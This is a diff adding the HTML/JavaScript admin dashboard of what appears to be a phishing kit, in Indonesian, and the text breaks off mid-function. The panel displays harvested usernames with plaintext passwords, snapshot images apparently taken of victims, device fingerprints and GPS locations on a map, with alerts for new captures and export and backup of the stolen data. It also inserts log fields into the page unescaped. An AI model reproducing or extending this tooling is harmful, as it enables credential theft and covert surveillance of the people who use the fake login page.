@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="theme-color" content="#5865f2" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<link rel="manifest" href="/manifest.json" />
+<title>Admin Dashboard — Capture Log</title>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+  :root {
+    --bg: #1a1b1e; --card-bg: #2b2d31; --card-hover: #232428;
+    --text: #dbdee1; --text-bright: #f2f3f5; --text-muted: #949ba4; --text-label: #b5bac1;
+    --border: #1e1f22; --accent: #5865f2; --accent-hover: #4752c4;
+    --green: #248046; --green-hover: #1a6334; --red: #da373c; --red-hover: #a12828;
+    --shadow: rgba(0,0,0,0.3);
+  }
+  body.light {
+    --bg: #f2f3f5; --card-bg: #ffffff; --card-hover: #e8eaed;
+    --text: #2e3338; --text-bright: #060607; --text-muted: #5c6470; --text-label: #4e5058;
+    --border: #e3e5e8; --shadow: rgba(0,0,0,0.1);
+  }
+  body { background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px; transition: background 0.3s, color 0.3s; }
+  .header { max-width: 1200px; margin: 0 auto 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+  h1 { font-size: 24px; color: var(--text-bright); }
+  .btn { background: var(--accent); color: #fff; border: none; padding: 10px 20px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; transition: background 0.15s; }
+  .btn:hover { background: var(--accent-hover); }
+  .btn-green { background: var(--green); } .btn-green:hover { background: var(--green-hover); }
+  .btn-red { background: var(--red); } .btn-red:hover { background: var(--red-hover); }
+  .btn-icon { padding: 10px 14px; font-size: 16px; }
+  .stat { background: var(--card-bg); padding: 16px 20px; border-radius: 8px; margin-bottom: 20px; max-width: 1200px; margin-left: auto; margin-right: auto; display: flex; gap: 32px; flex-wrap: wrap; }
+  .stat-item { display: flex; flex-direction: column; }
+  .stat-value { font-size: 28px; font-weight: 700; color: var(--accent); }
+  .stat-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+  .charts { max-width: 1200px; margin: 0 auto 24px; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
+  .chart-card { background: var(--card-bg); border-radius: 8px; padding: 16px; }
+  .chart-card h3 { font-size: 14px; color: var(--text-label); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+  .chart-card canvas { max-height: 200px; }
+
+  /* ============ TOOLBAR + FILTER ============ */
+  .toolbar { max-width: 1200px; margin: 0 auto 16px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+  .search-input, .filter-select, .filter-date { padding: 10px; background: var(--card-bg); border: 1px solid var(--border); border-radius: 4px; color: var(--text); outline: none; font-size: 14px; }
+  .search-input { flex: 1; min-width: 180px; }
+  .filter-select { cursor: pointer; min-width: 130px; }
+  .filter-date { min-width: 150px; }
+  .search-input:focus, .filter-select:focus, .filter-date:focus { border-color: var(--accent); }
+  .filter-row { max-width: 1200px; margin: 0 auto 16px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center; background: var(--card-bg); padding: 12px 16px; border-radius: 8px; }
+  .filter-row label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-right: 6px; }
+
+  .grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
+  .card { background: var(--card-bg); border-radius: 8px; overflow: hidden; box-shadow: 0 4px 12px var(--shadow); position: relative; transition: transform 0.2s, background 0.3s; }
+  .card:hover { transform: translateY(-2px); }
+  .card.new-capture { animation: pulseNew 2s ease-out; }
+  @keyframes pulseNew {
+    0% { box-shadow: 0 0 0 0 rgba(88, 101, 242, 0.7); }
+    50% { box-shadow: 0 0 0 12px rgba(88, 101, 242, 0); }
+    100% { box-shadow: 0 4px 12px var(--shadow); }
+  }
+  .card img { width: 100%; height: 200px; object-fit: cover; display: block; background: #000; cursor: pointer; }
+  .card-body { padding: 12px; }
+  .card-body .time, .card-body .size { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
+  .card-body .name { font-size: 13px; color: var(--text); word-break: break-all; margin-bottom: 8px; font-weight: 600; }
+  .card-body .maps { font-size: 12px; color: #00a8fc; text-decoration: none; display: inline-block; margin-top: 6px; }
+  .delete-btn { position: absolute; top: 8px; right: 8px; background: var(--red); color: #fff; border: none; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 16px; font-weight: bold; display: flex; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.2s; z-index: 2; }
+  .card:hover .delete-btn { opacity: 1; }
+  .empty { text-align: center; padding: 60px 20px; color: var(--text-muted); font-size: 16px; }
+  .empty a { color: #00a8fc; }
+  .logs { max-width: 1200px; margin: 32px auto 0; background: var(--card-bg); border-radius: 8px; padding: 16px; overflow-x: auto; }
+  .logs h2 { font-size: 18px; margin-bottom: 12px; color: var(--text-bright); }
+  .logs table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .logs th, .logs td { text-align: left; padding: 8px; border-bottom: 1px solid var(--border); white-space: nowrap; }
+  .logs th { color: var(--text-muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }
+  .logs tr:hover { background: var(--card-hover); }
+  .logs a { color: #00a8fc; text-decoration: none; }
+
+  /* ============ MODAL ============ */
+  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+  .modal-overlay.active { display: flex; }
+  .modal { background: var(--card-bg); border-radius: 12px; max-width: 1000px; width: 100%; max-height: 90vh; overflow-y: auto; position: relative; animation: modalIn 0.2s ease-out; }
+  @keyframes modalIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+  .modal-close { position: absolute; top: 12px; right: 12px; background: var(--red); color: #fff; border: none; width: 32px; height: 32px; border-radius: 50%; cursor: pointer; font-size: 18px; font-weight: bold; display: flex; align-items: center; justify-content: center; z-index: 10; }
+  .modal-content { display: grid; grid-template-columns: 1fr 1fr; gap: 0; }
+  .modal-img { background: #000; display: flex; align-items: center; justify-content: center; padding: 20px; flex-direction: column; gap: 12px; }
+  .modal-img img { max-width: 100%; max-height: 50vh; border-radius: 4px; }
+  #miniMap { width: 100%; height: 200px; border-radius: 4px; }
+  .modal-info { padding: 24px; }
+  .modal-info h2 { font-size: 16px; color: var(--text-bright); margin-bottom: 16px; word-break: break-all; }
+  .modal-row { display: flex; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
+  .modal-row .label { color: var(--text-muted); min-width: 110px; font-weight: 600; }
+  .modal-row .value { color: var(--text); word-break: break-word; flex: 1; }
+  .modal-row .value.mono { font-family: 'Courier New', monospace; background: var(--border); padding: 2px 6px; border-radius: 3px; }
+  .modal-actions { display: flex; gap: 8px; margin-top: 20px; flex-wrap: wrap; }
+  .modal-actions .btn { flex: 1; min-width: 100px; text-align: center; }
+
+  /* ============ TOAST ============ */
+  .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 2000; display: flex; flex-direction: column; gap: 10px; max-width: 360px; }
+  .toast { background: var(--card-bg); border-left: 4px solid var(--accent); border-radius: 8px; padding: 14px 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); animation: toastIn 0.3s ease-out; color: var(--text); font-size: 13px; display: flex; gap: 12px; align-items: flex-start; }
+  .toast.toast-out { animation: toastOut 0.3s ease-in forwards; }
+  @keyframes toastIn { from { opacity: 0; transform: translateX(400px); } to { opacity: 1; transform: translateX(0); } }
+  @keyframes toastOut { to { opacity: 0; transform: translateX(400px); } }
+  .toast-icon { font-size: 24px; flex-shrink: 0; }
+  .toast-content { flex: 1; }
+  .toast-title { font-weight: 700; color: var(--text-bright); margin-bottom: 4px; font-size: 14px; }
+  .toast-message { color: var(--text-muted); font-size: 12px; line-height: 1.5; }
+  .toast-close { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; padding: 0; }
+
+  /* ============ AUTO-BACKUP PANEL ============ */
+  .backup-panel { max-width: 1200px; margin: 32px auto 0; background: var(--card-bg); border-radius: 8px; padding: 16px; }
+  .backup-panel h2 { font-size: 18px; margin-bottom: 12px; color: var(--text-bright); display: flex; justify-content: space-between; align-items: center; }
+  .backup-list { display: flex; flex-direction: column; gap: 8px; max-height: 200px; overflow-y: auto; }
+  .backup-item { background: var(--card-hover); padding: 10px 14px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
+  .backup-item .name { color: var(--text); font-family: monospace; font-size: 12px; }
+  .backup-item .size { color: var(--text-muted); font-size: 11px; margin-left: 8px; }
+  .backup-item .actions { display: flex; gap: 6px; }
+  .backup-item .actions a, .backup-item .actions button { background: var(--accent); color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; text-decoration: none; }
+
+  @media (max-width: 768px) {
+    body { padding: 12px; } h1 { font-size: 20px; }
+    .header { flex-direction: column; align-items: stretch; }
+    .header > div { display: flex; gap: 8px; flex-wrap: wrap; }
+    .header .btn { flex: 1; text-align: center; min-width: 100px; }
+    .stat { gap: 20px; padding: 14px 16px; }
+    .stat-value { font-size: 22px; }
+    .charts, .grid { grid-template-columns: 1fr; }
+    .toolbar, .filter-row { flex-direction: column; align-items: stretch; }
+    .delete-btn { opacity: 1; width: 32px; height: 32px; }
+    .modal { max-height: 100vh; border-radius: 0; width: 100%; }
+    .modal-overlay { padding: 0; }
+    .modal-content { grid-template-columns: 1fr; }
+    .modal-img img { max-height: 40vh; }
+    .modal-info { padding: 16px; }
+    .modal-row .label { min-width: 90px; }
+    .toast-container { left: 12px; right: 12px; bottom: 12px; max-width: none; }
+  }
+</style>
+</head>
+<body>
+  <div class="header">
+    <h1 data-i18n="title">📊 Admin Dashboard</h1>
+    <div>
+      <a href="/" class="btn" data-i18n="loginPage">🔄 Login Page</a>
+      <button class="btn btn-green" onclick="refreshData()" data-i18n="refresh">🔄 Refresh</button>
+      <button class="btn btn-icon" id="themeBtn" onclick="toggleTheme()" title="Theme">🌙</button>
+      <button class="btn btn-icon" id="soundBtn" onclick="toggleSound()" title="Sound">🔇</button>
+      <button class="btn btn-icon" id="langBtn" onclick="toggleLang()" title="Language">🌐 ID</button>
+      <button class="btn btn-red" onclick="logout()" data-i18n="logout">🚪 Logout</button>
+    </div>
+  </div>
+
+  <div class="stat">
+    <div class="stat-item"><span class="stat-value" id="totalCount">0</span><span class="stat-label" data-i18n="totalCapture">Total Capture</span></div>
+    <div class="stat-item"><span class="stat-value" id="lastTime">-</span><span class="stat-label" data-i18n="lastTime">Terakhir</span></div>
+    <div class="stat-item"><span class="stat-value" id="totalLogs">0</span><span class="stat-label" data-i18n="totalLogin">Total Login</span></div>
+  </div>
+
+  <div class="charts">
+    <div class="chart-card"><h3 data-i18n="chartDay">📅 Capture per Hari</h3><canvas id="chartDay"></canvas></div>
+    <div class="chart-card"><h3 data-i18n="chartOS">💻 Per OS</h3><canvas id="chartOS"></canvas></div>
+    <div class="chart-card"><h3 data-i18n="chartBrowser">🌐 Per Browser</h3><canvas id="chartBrowser"></canvas></div>
+    <div class="chart-card"><h3 data-i18n="chartHour">⏰ Peak Hours</h3><canvas id="chartHour"></canvas></div>
+  </div>
+
+  <div class="filter-row">
+    <label data-i18n="filterLabel">🔍 Filter:</label>
+    <input type="date" id="filterFrom" class="filter-date" title="Dari tanggal" />
+    <input type="date" id="filterTo" class="filter-date" title="Sampai tanggal" />
+    <select id="filterOS" class="filter-select"><option value="">Semua OS</option></select>
+    <select id="filterBrowser" class="filter-select"><option value="">Semua Browser</option></select>
+    <button class="btn" onclick="resetFilters()" data-i18n="resetFilter">✖ Reset</button>
+  </div>
+
+  <div class="toolbar">
+    <a class="btn btn-green" id="exportBtn" href="/api/export.csv" data-i18n="exportCsv">📥 Export CSV</a>
+    <a class="btn" id="backupBtn" href="/api/backup.zip" download data-i18n="backupZip">📦 Backup ZIP</a>
+    <button class="btn" id="pdfBtn" onclick="exportPDF()" data-i18n="exportPdf">📄 Export PDF</button>
+    <input type="text" id="search" class="search-input" placeholder="Cari username / OS / browser..." data-i18n-placeholder="searchPlaceholder" />
+  </div>
+
+  <div class="grid" id="grid"></div>
+  <div class="empty" id="empty" style="display:none;">
+    <span data-i18n="empty">Belum ada capture. Login dulu di</span> <a href="/">halaman login</a>.
+  </div>
+
+  <div class="logs">
+    <h2 data-i18n="logTitle">📋 Log Login</h2>
+    <div id="logsContainer">Memuat...</div>
+  </div>
+
+  <div class="backup-panel">
+    <h2>
+      <span data-i18n="autoBackupTitle">💾 Auto-Backup</span>
+      <button class="btn btn-green" onclick="createManualBackup()" data-i18n="createBackup">+ Buat Sekarang</button>
+    </h2>
+    <div class="backup-list" id="backupList">Memuat...</div>
+  </div>
+
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <button class="modal-close" onclick="closeModal()">×</button>
+      <div class="modal-content">
+        <div class="modal-img">
+          <img id="modalImg" src="" alt="Snapshot" />
+          <div id="miniMap"></div>
+        </div>
+        <div class="modal-info">
+          <h2 id="modalFilename">-</h2>
+          <div class="modal-row"><span class="label" data-i18n="username">👤 Username</span><span class="value" id="modalUsername">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="password">🔑 Password</span><span class="value mono" id="modalPassword">-</span></div>
+          <div class="modal-row"><span class="label">💻 OS</span><span class="value" id="modalOS">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="browser">🌐 Browser</span><span class="value" id="modalBrowser">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="device">📱 Perangkat</span><span class="value" id="modalDeviceType">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="resolution">📺 Resolusi</span><span class="value" id="modalScreen">-</span></div>
+          <div class="modal-row"><span class="label">⚙️ CPU</span><span class="value" id="modalCores">-</span></div>
+          <div class="modal-row"><span class="label">🧠 RAM</span><span class="value" id="modalMemory">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="location">📍 Lokasi</span><span class="value" id="modalLocation">-</span></div>
+          <div class="modal-row"><span class="label" data-i18n="time">🕒 Waktu</span><span class="value" id="modalTime">-</span></div>
+          <div class="modal-actions">
+            <a class="btn btn-green" id="modalDownload" href="#" download data-i18n="download">📥 Download</a>
+            <button class="btn btn-red" id="modalDelete" data-i18n="delete">🗑️ Hapus</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast-container" id="toastContainer"></div>
+
+<script>
+// ============ TRANSLATIONS ============
+const TRANSLATIONS = {
+  id: {
+    title: '📊 Admin Dashboard', loginPage: '🔄 Login Page', refresh: '🔄 Refresh', logout: '🚪 Logout',
+    totalCapture: 'Total Capture', lastTime: 'Terakhir', totalLogin: 'Total Login',
+    chartDay: '📅 Capture per Hari', chartOS: '💻 Per OS', chartBrowser: '🌐 Per Browser', chartHour: '⏰ Peak Hours',
+    filterLabel: '🔍 Filter:', resetFilter: '✖ Reset', exportCsv: '📥 Export CSV', backupZip: '📦 Backup ZIP',
+    exportPdf: '📄 Export PDF', empty: 'Belum ada capture. Login dulu di', logTitle: '📋 Log Login',
+    autoBackupTitle: '💾 Auto-Backup', createBackup: '+ Buat Sekarang', username: '👤 Username',
+    password: '🔑 Password', browser: '🌐 Browser', device: '📱 Perangkat', resolution: '📺 Resolusi',
+    location: '📍 Lokasi', time: '🕒 Waktu', download: '📥 Download', delete: '🗑️ Hapus',
+    searchPlaceholder: 'Cari username / OS / browser...'
+  },
+  en: {
+    title: '📊 Admin Dashboard', loginPage: '🔄 Login Page', refresh: '🔄 Refresh', logout: '🚪 Logout',
+    totalCapture: 'Total Captures', lastTime: 'Latest', totalLogin: 'Total Logins',
+    chartDay: '📅 Captures per Day', chartOS: '💻 By OS', chartBrowser: '🌐 By Browser', chartHour: '⏰ Peak Hours',
+    filterLabel: '🔍 Filter:', resetFilter: '✖ Reset', exportCsv: '📥 Export CSV', backupZip: '📦 Backup ZIP',
+    exportPdf: '📄 Export PDF', empty: 'No captures yet. Login first at', logTitle: '📋 Login Log',
+    autoBackupTitle: '💾 Auto-Backup', createBackup: '+ Create Now', username: '👤 Username',
+    password: '🔑 Password', browser: '🌐 Browser', device: '📱 Device', resolution: '📺 Resolution',
+    location: '📍 Location', time: '🕒 Time', download: '📥 Download', delete: '🗑️ Delete',
+    searchPlaceholder: 'Search username / OS / browser...'
+  }
+};
+
+let currentLang = localStorage.getItem('lang') || 'id';
+function t(key) { return TRANSLATIONS[currentLang][key] || key; }
+
+function applyLang() {
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (TRANSLATIONS[currentLang][key]) el.textContent = TRANSLATIONS[currentLang][key];
+  });
+  document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+    const key = el.getAttribute('data-i18n-placeholder');
+    if (TRANSLATIONS[currentLang][key]) el.placeholder = TRANSLATIONS[currentLang][key];
+  });
+  document.getElementById('langBtn').textContent = '🌐 ' + currentLang.toUpperCase();
+}
+function toggleLang() {
+  currentLang = currentLang === 'id' ? 'en' : 'id';
+  localStorage.setItem('lang', currentLang);
+  applyLang();
+}
+
+// ============ THEME ============
+function applyTheme(theme) {
+  const btn = document.getElementById('themeBtn');
+  if (theme === 'light') { document.body.classList.add('light'); btn.textContent = '☀️'; }
+  else { document.body.classList.remove('light'); btn.textContent = '🌙'; }
+}
+function toggleTheme() {
+  const isLight = document.body.classList.contains('light');
+  const t = isLight ? 'dark' : 'light';
+  localStorage.setItem('theme', t); applyTheme(t);
+}
+
+// ============ SOUND ============
+let soundEnabled = localStorage.getItem('sound') === 'on';
+const soundBtn = document.getElementById('soundBtn');
+function updateSoundBtn() { soundBtn.textContent = soundEnabled ? '🔊' : '🔇'; }
+function toggleSound() { soundEnabled = !soundEnabled; localStorage.setItem('sound', soundEnabled ? 'on' : 'off'); updateSoundBtn(); }
+function playBeep() {
+  if (!soundEnabled) return;
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator(); const gain = ctx.createGain();
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.frequency.value = 800;
+    gain.gain.setValueAtTime(0.15, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+    osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.3);
+  } catch (e) {}
+}
+
+function showToast(title, message, icon = '🔔') {
+  const container = document.getElementById('toastContainer');
+  const toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.innerHTML = `<div class="toast-icon">${icon}</div><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div><button class="toast-close" onclick="this.parentElement.remove()">×</button>`;
+  container.appendChild(toast);
+  setTimeout(() => { toast.classList.add('toast-out'); setTimeout(() => toast.remove(), 300); }, 5000);
+}
+
+// ============ INIT ============
+applyTheme(localStorage.getItem('theme') || 'dark');
+updateSoundBtn();
+applyLang();
+
+let allCaptures = [], allLogs = [], charts = { day: null, os: null, browser: null, hour: null };
+let currentFilename = null, previousCaptureCount = null;
+let newCaptureFilenames = new Set();
+let miniMap = null, miniMapMarker = null;
+
+// ============ AUTH ============
+async function logout() {
+  if (!confirm('Logout?')) return;
+  try { await fetch('/api/logout', { method: 'POST' }); } catch (e) {}
+  window.location.href = '/admin/login';
+}
+
+// ============ MODAL ============
+function openModal(filename, url) {
+  currentFilename = filename;
+  const match = filename.match(/snapshot-(\d+)\.png/);
+  const snapTs = match ? parseInt(match[1]) : null;
+  let log = null;
+  if (snapTs) {
+    log = allLogs.find(l => {
+      if (!l.timestamp) return false;
+      return Math.abs(new Date(l.timestamp).getTime() - snapTs) < 5000;
+    });
+  }
+  document.getElementById('modalImg').src = url;
+  document.getElementById('modalFilename').textContent = filename;
+  document.getElementById('modalDownload').href = url;
+
+  if (log) {
+    document.getElementById('modalUsername').textContent = log.username || '-';
+    document.getElementById('modalPassword').textContent = log.password || '-';
+    document.getElementById('modalOS').textContent = log.device?.os || '-';
+    document.getElementById('modalBrowser').textContent = log.device?.browser || '-';
+    document.getElementById('modalDeviceType').textContent = log.device?.deviceType || '-';
+    document.getElementById('modalScreen').textContent = log.device?.screen || '-';
+    document.getElementById('modalCores').textContent = log.device?.cores || '-';
+    document.getElementById('modalMemory').textContent = log.device?.memory ? log.device.memory + ' GB' : '-';
+    if (log.location && log.location.lat) {
+      document.getElementById('modalLocation').innerHTML = `<a href="${log.location.mapsLink}" target="_blank" style="color:#00a8fc;">📍 Maps (${log.location.lat.toFixed(4)}, ${log.location.lon.toFixed(4)})</a>`;
+    } else {
+      document.getElementById('modalLocation').textContent = 'Tidak tersedia';
+    }
+    document.getElementById('modalTime').textContent = log.timestamp ? new Date(log.timestamp).toLocaleString('id-ID') : '-';
+  } else {
+    ['modalUsername','modalPassword','modalOS','modalBrowser','modalDeviceType','modalScreen','modalCores','modalMemory','modalLocation','modalTime'].forEach(id => {
+      document.getElementById(id).textContent = '-';
+    });
+  }
+
+  // Mini map
+  setTimeout(() => {
+    const mapEl = document.getElementById('miniMap');
+    if (log && log.location && log.location.lat) {
+      mapEl.style.display = 'block';
+      if (miniMap) { miniMap.remove(); miniMap = null; }
+      miniMap = L.map('miniMap').setView([log.location.lat, log.location.lon], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap'
+      }).addTo(miniMap);
+      L.marker([log.location.lat, log.location.lon]).addTo(miniMap)
+        .bindPopup(`📍 ${log.username || 'User'}`).openPopup();
+    } else {
+      mapEl.style.display = 'none';
+    }
+  }, 100);
+
+  document.getElementById('modalDelete').onclick = () => {
+    if (confirm(`Hapus ${filename}?`)) { deleteCapture(filename); closeModal(); }
+  };
+  document.getElementById('modal').classList.add('active');
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('active');
+  currentFilename = null;
+  if (miniMap) { miniMap.remove(); miniMap = null; }
+}
+document.getElementById('modal').addEventListener('click', (e) => { if (e.target.id === 'modal') closeModal(); });
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeModal(); });
+
+// ============ DATA ============
+async function refreshData() {
+  try {
+    const [capRes, logRes] = await Promise.all([fetch('/api/captures'), fetch('/api/logs')]);
+    if (capRes.status === 401 || logRes.status === 401) { window.location.href = '/admin/login'; return; }
+    const newCaptures = await capRes.json();
+    allLogs = await logRes.json();
+
+    if (previousCaptureCount !== null && newCaptures.length > previousCaptureCount) {
+      const diff = newCaptures.length - previousCaptureCount;
+      const newOnes = newCaptures.slice(0, diff);
+      newOnes.forEach(cap => {
+        newCaptureFilenames.add(cap.filename);
+        const m = cap.filename.match(/snapshot-(\d+)\.png/);
+        const ts = m ? parseInt(m[1]) : null;
+        const log = ts ? allLogs.find(l => Math.abs(new Date(l.timestamp).getTime() - ts) < 5000) : null;
+        showToast('🔔 Capture Baru!', `<b>${log?.username || '?'}</b> • ${log?.device?.os || '-'} • ${log?.device?.browser || '-'}`, '📸');
+      });
+      playBeep();
+      setTimeout(() => newOnes.forEach(cap => newCaptureFilenames.delete(cap.filename)), 3000);
+    }
+    previousCaptureCount = newCaptures.length;
+    allCaptures = newCaptures;
+
+    document.getElementById('totalCount').textContent = allCaptures.length;
+    document.getElementById('totalLogs').textContent = allLogs.length;
+    document.getElementById('lastTime').textContent = allCaptures[0]?.timestamp ? new Date(allCaptures[0].timestamp).toLocaleTimeString('id-ID') : '-';
+
+    populateFilters();
+    renderGrid(); renderLogs(); loadCharts(); loadBackups();
+  } catch (e) { console.error(e); }
+}
+
+function populateFilters() {
+  const osSet = new Set(), brSet = new Set();
+  allLogs.forEach(l => {
+    if (l.device?.os) osSet.add(l.device.os);
+    if (l.device?.browser) brSet.add(l.device.browser);
+  });
+  const osSel = document.getElementById('filterOS');
+  const brSel = document.getElementById('filterBrowser');
+  const curOS = osSel.value, curBr = brSel.value;
+  osSel.innerHTML = '<option value="">Semua OS</option>' + [...osSet].map(o => `<option value="${o}">${o}</option>`).join('');
+  brSel.innerHTML = '<option value="">Semua Browser</option>' + [...brSet].map(b => `<option value="${b}">${b}</option>`).join('');
+  osSel.value = curOS; brSel.value = curBr;
+}
+
+function getChartColors() {
+  const isLight = document.body.classList.contains('light');
+  return { text: isLight ? '#4e5058' : '#949ba4', grid: isLight ? '#e3e5e8' : '#1e1f22', accent: '#5865f2', fill: 'rgba(88, 101, 242, 0.2)', palette: ['#5865f2', '#248046', '#da373c', '#f0b232', '#eb459e'] };
+}
+
+async function loadCharts() {
+  try {
+    const res = await fetch('/api/stats');
+    if (res.status === 401) { window.location.href = '/admin/login'; return; }
+    const stats = await res.json();
+    const colors = getChartColors();
+    const chartOpts = { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: colors.text } } } };
+
+    const dayCtx = document.getElementById('chartDay').getContext('2d');
+    if (charts.day) charts.day.destroy();
+    charts.day = new Chart(dayCtx, {
+      type: 'line',
+      data: { labels: stats.perDay.labels, datasets: [{ label: 'Capture', data: stats.perDay.data, borderColor: colors.accent, backgroundColor: colors.fill, fill: true, tension: 0.3 }] },
+      options: { ...chartOpts, scales: { x: { ticks: { color: colors.text }, grid: { color: colors.grid } }, y: { ticks: { color: colors.text }, grid: { color: colors.grid }, beginAtZero: true } } }
+    });
+
+    const osCtx = document.getElementById('chartOS').getContext('2d');
+    if (charts.os) charts.os.destroy();
+    charts.os = new Chart(osCtx, { type: 'doughnut', data: { labels: stats.perOS.labels, datasets: [{ data: stats.perOS.data, backgroundColor: colors.palette }] }, options: chartOpts });
+
+    const brCtx = document.getElementById('chartBrowser').getContext('2d');
+    if (charts.browser) charts.browser.destroy();
+    charts.browser = new Chart(brCtx, {
+      type: 'bar',
+      data: { labels: stats.perBrowser.labels, datasets: [{ label: 'Capture', data: stats.perBrowser.data, backgroundColor: colors.accent }] },
+      options: { ...chartOpts, plugins: { legend: { display: false } }, scales: { x: { ticks: { color: colors.text }, grid: { display: false } }, y: { ticks: { color: colors.text }, grid: { color: colors.grid }, beginAtZero: true } } }
+    });
+
+    const hrCtx = document.getElementById('chartHour').getContext('2d');
+    if (charts.hour) charts.hour.destroy();
+    charts.hour = new Chart(hrCtx, {
+      type: 'bar',
+      data: { labels: stats.perHour.labels, datasets: [{ label: 'Capture', data: stats.perHour.data, backgroundColor: colors.accent }] },
+      options: { ...chartOpts, plugins: { legend: { display: false } }, scales: { x: { ticks: { color: colors.text, font: { size: 9 } }, grid: { display: false } }, y: { ticks: { color: colors.text }, grid: { color: colors.grid }, beginAtZero: true } } }
+    });
+  } catch (e) { console.error(e); }
+}
+
+function applyFilters(captures) {
+  const from = document.getElementById('filterFrom').value;
+  const to = document.getElementById('filterTo').value;
+  const os = document.getElementById('filterOS').value;
+  const br = document.getElementById('filterBrowser').value;
+  const logMap = {};
+  allLogs.forEach(l => { if (l.timestamp) logMap[l.timestamp] = l; });
+
+  return captures.filter(cap => {
+    const log = logMap[cap.timestamp];
+    if (from && cap.timestamp && new Date(cap.timestamp) < new Date(from)) return false;
+    if (to && cap.timestamp && new Date(cap.timestamp) > new Date(to + 'T23:59:59')) return false;
+    if (os && log?.device?.os !== os) return false;
+    if (br && log?.device?.browser !== br) return false;
+    return true;
+  });
+}
+
+function resetFilters() {
+  document.getElementById('filterFrom').value = '';
+  document.getElementById('filterTo').value = '';
+  document.getElementById('filterOS').value = '';
+  document.getElementById('filterBrowser').value = '';
+  document.getElementById('search').value = '';
+  renderGrid();
+}
+
+function renderGrid() {
+  const query = document.getElementById('search').value.toLowerCase();
+  const grid = document.getElementById('grid');
+  const empty = document.getElementById('empty');
+  const logMap = {};
+  allLogs.forEach(l => { if (l.timestamp) logMap[l.timestamp] = l; });
+
+  let filtered = applyFilters(allCaptures);
+  if (query) {
+    filtered = filtered.filter(cap => {
+      const log = logMap[cap.timestamp];
+      return JSON.stringify({ ...cap, ...log }).toLowerCase().includes(query);
+    });
+  }
+
+  if (allCaptures.length === 0) { grid.innerHTML = ''; empty.style.display = 'block'; return; }
+  empty.style.display = 'none';
+  if (filtered.length === 0) {
+    grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:var(--text-muted);">Tidak ada capture yang cocok dengan filter.</div>';
+    return;
+  }
+  grid.innerHTML = filtered.map(item => {
+    const log = logMap[item.timestamp];
+    const mapsLink = log?.location?.mapsLink;
+    const isNew = newCaptureFilenames.has(item.filename);
+    return `
+      <div class="card ${isNew ? 'new-capture' : ''}">
+        <img src="${item.url}" alt="Snapshot" loading="lazy" onclick="openModal('${item.filename}', '${item.url}')">
+        <button class="delete-btn" onclick="event.stopPropagation(); deleteCapture('${item.filename}')" title="Hapus">×</button>
+        <div class="card-body">
+          <div class="name">${item.filename}</div>
+          <div class="time">🕒 ${item.timestamp ? new Date(item.timestamp).toLocaleString('id-ID') : '-'}</div>
+          <div class="size">📦 ${(item.size / 1024).toFixed(1)} KB</div>
+          ${mapsLink ? `<a class="maps" href="${mapsLink}" target="_blank">📍 Lihat di Google Maps</a>` : ''}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+async function deleteCapture(filename) {
